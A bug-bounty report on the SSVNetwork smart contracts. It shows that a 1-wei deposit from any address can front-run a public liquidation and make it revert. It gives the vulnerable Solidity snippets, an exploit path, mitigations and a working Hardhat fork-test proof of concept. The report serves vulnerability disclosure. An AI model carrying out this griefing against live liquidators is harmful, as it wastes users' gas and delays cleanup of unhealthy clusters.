# One-wei third-party deposits can invalidate pending public liquidations
Severity: Medium

Bounty Criteria Match: medium (smart contract): Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol); medium (smart contract): Theft of gas

Affected Contracts:
- [`SSVNetwork.liquidate`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/SSVNetwork.sol#L271-L277) and [`SSVNetwork.deposit`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/SSVNetwork.sol#L294-L300)
- [`SSVClusters.liquidate`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/modules/SSVClusters.sol#L31-L64) and [`SSVClusters.deposit`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/modules/SSVClusters.sol#L186-L201)
- [`ClusterLib.validateHashedCluster`](https://github.com/ssvlabs/ssv-network/blob/9bb7b21d4432f34f623bed3e0bb3fa77f1e5d2b9/contracts/libraries/ClusterLib.sol#L131-L148)

# Finding Description and Impact
Any address can front-run a public liquidation by sending a dust ETH deposit to the target cluster, changing the stored cluster hash and making the liquidator's queued transaction revert with `IncorrectClusterState`. This does not steal cluster funds, but it lets an unprivileged attacker repeatedly waste liquidator gas and delay cleanup of unhealthy clusters.

This matches Immunefi's Medium griefing posture: the attacker need not profit, but a front-run transaction can force another user's valid transaction to revert and require a retry.

- `deposit` accepts arbitrary callers and arbitrary positive dust values for another owner's ETH cluster.
- The stored cluster hash includes `cluster.balance`, so a 1 wei deposit makes the liquidator's previously correct cluster struct stale.
- `liquidate` validates the caller-supplied cluster hash before reaching the liquidatability check, so stale liquidation attempts fail early.

The attacker-controlled deposit mutates the cluster state hash without ownership checks or a minimum meaningful deposit:

```solidity
(bytes32 hashedCluster, uint8 version) = cluster.validateHashedCluster(clusterOwner, operatorIds, s);
ClusterLib.validateClusterVersion(version, VERSION_ETH);

cluster.balance += msg.value;

s.ethClusters[hashedCluster] = cluster.hashClusterData();
```

Public liquidation validates the supplied cluster state before checking whether the cluster is liquidatable:

```solidity
(bytes32 hashedCluster, uint8 version) = cluster.validateHashedCluster(clusterOwner, operatorIds, s);
ClusterLib.validateClusterVersion(version, VERSION_ETH);
cluster.validateClusterIsNotLiquidated();
```

The validation rejects any stale cluster struct whose hash no longer matches storage:

```solidity
bytes32 hashedClusterData = hashClusterData(cluster);

(bytes32 clusterData, uint8 detectedVersion) = getClusterData(hashedCluster, s);
if (clusterData == bytes32(0)) {
    revert ISSVNetworkCore.ClusterDoesNotExist();
} else if (clusterData != hashedClusterData) {
    revert ISSVNetworkCore.IncorrectClusterState();
}
```

### **Exploit Path**
1. A liquidator observes an ETH cluster that has become publicly liquidatable.
2. The liquidator submits `liquidate(clusterOwner, operatorIds, queuedCluster)`.
3. An attacker front-runs with `deposit(clusterOwner, operatorIds, queuedCluster)` and `msg.value = 1`.
4. The deposit increments `cluster.balance` and stores a new cluster hash.
5. The liquidator's transaction executes with the stale `queuedCluster` and reverts before liquidation checks.

### **Impact**
- Repeated public liquidation attempts can be forced to waste gas.
- Unhealthy clusters can remain active longer unless liquidators refresh state and win ordering.
- The issue matches the program's Medium griefing and theft-of-gas rows.

Severity is Medium because the demonstrated impact is permissionless griefing and gas theft, not direct theft, fund freezing, or insolvency.

### **Recommended Mitigation Steps**
- Require `deposit` for an existing cluster to be called only by the `clusterOwner`, or require signed cluster-owner authorization for third-party deposits.
- Alternatively, make public liquidation tolerant of harmless positive balance deltas by deriving the current cluster state from storage before liquidatability checks.
- Add a regression test where a third-party dust deposit cannot invalidate a pending liquidation or cannot be made without authorization.

## Proof of Concept
The verified PoC is the repository Hardhat fork test below. It runs only against a local fork simulation and does not broadcast transactions or mutate live protocol state.

Save as: `test/DustDepositLiquidationGriefingPoC.test.ts`

Run: `MAINNET_RPC_URL=<mainnet rpc url> RUN_FORK=true npx hardhat test test/DustDepositLiquidationGriefingPoC.test.ts`

```typescript
import { expect } from "chai";
import type { NetworkConnection } from "hardhat/types/network";
import type { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/types";
import { ssvNetworkFullForkedFixture } from "./setup/fixtures.ts";
import type { NetworkHelpersType } from "./common/types.ts";
import { DEFAULT_SHARES, EMPTY_CLUSTER } from "./common/constants.ts";
import { Errors } from "./common/errors.ts";
import { Events } from "./common/events.ts";
import {
  makePublicKey,
  parseClusterFromEvent,
  registerOperators,
  setAccountBalance,
  whitelistAddresses,
} from "./helpers/index.ts";
import { getForkedConnection } from "./setup/connection.ts";
import { ForkConfig } from "./forked/v2.0.0/config.ts";

const RUN_FORK = process.env.RUN_FORK === "true";
const suite = RUN_FORK ? describe : describe.skip;

suite("Dust deposit liquidation griefing PoC", () => {
  let connection: NetworkConnection<"generic">;
  let networkHelpers: NetworkHelpersType;
  let operatorOwner: HardhatEthersSigner;
  let clusterOwner: HardhatEthersSigner;
  let attacker: HardhatEthersSigner;
  let liquidator: HardhatEthersSigner;

  before(async function () {
    ({ connection, networkHelpers } = await getForkedConnection());
    [operatorOwner, clusterOwner, attacker, liquidator] = await connection.ethers.getSigners();

    for (const signer of [operatorOwner, clusterOwner, attacker, liquidator]) {
      await setAccountBalance(connection.ethers.provider, signer.address, connection.ethers.parseEther("100"));
    }
  });

  const deployFullSSVNetworkForkFixture = async () => ssvNetworkFullForkedFixture(connection);

  it("dust deposit invalidates a queued public liquidation", async function () {
    const { network, views } = await networkHelpers.loadFixture(deployFullSSVNetworkForkFixture);
    expect(await network.getAddress()).to.equal(ForkConfig.SSV_NETWORK_ADDRESS);

    // Setup: register a cluster barely above its public liquidation threshold.
    const operatorIds = await registerOperators(network, operatorOwner, 4);
    await whitelistAddresses(network, operatorOwner, operatorIds, [clusterOwner.address]);

    let operatorFees = 0n;
    for (const id of operatorIds) {
      operatorFees += await views.getOperatorFee(id);
    }
    const perBlockBurn = operatorFees + await views.getNetworkFee();
    const minBlocks = await views.getLiquidationThresholdPeriod();
    const minCollateral = await views.getMinimumLiquidationCollateral();
    const threshold = perBlockBurn * minBlocks;
    const minimumRequired = threshold > minCollateral ? threshold : minCollateral;
    const registerValue = minimumRequired + perBlockBurn * 2n;

    await setAccountBalance(connection.ethers.provider, clusterOwner.address, registerValue + connection.ethers.parseEther("1"));
    const registerTx = await network.connect(clusterOwner).registerValidator(
      makePublicKey(1),
      operatorIds,
      DEFAULT_SHARES,
      EMPTY_CLUSTER,
      { value: registerValue },
    );
    const queuedCluster = parseClusterFromEvent(network, await registerTx.wait(), Events.VALIDATOR_ADDED);

    expect(await views.isLiquidatable(clusterOwner.address, operatorIds, queuedCluster)).to.equal(false);
    await networkHelpers.mine(4);
    expect(await views.isLiquidatable(clusterOwner.address, operatorIds, queuedCluster)).to.equal(true);

    // Trigger: any third party can update the stored cluster hash with dust.
    const dust = 1n;
    const depositTx = await network.connect(attacker).deposit(
      clusterOwner.address,
      operatorIds,
      queuedCluster,
      { value: dust },
    );
    const dustedCluster = parseClusterFromEvent(network, await depositTx.wait(), Events.CLUSTER_DEPOSITED);
    expect(dustedCluster.balance).to.equal(queuedCluster.balance + dust);

    // Proof: the liquidator's previously valid transaction now reverts before liquidation checks.
    await expect(network.connect(liquidator).liquidate(
      clusterOwner.address,
      operatorIds,
      queuedCluster,
    )).to.be.revertedWithCustomError(network, Errors.INCORRECT_CLUSTER_STATE);

    await expect(network.connect(liquidator).liquidate(
      clusterOwner.address,
      operatorIds,
      dustedCluster,
    )).to.emit(network, Events.CLUSTER_LIQUIDATED);
  });
});
```
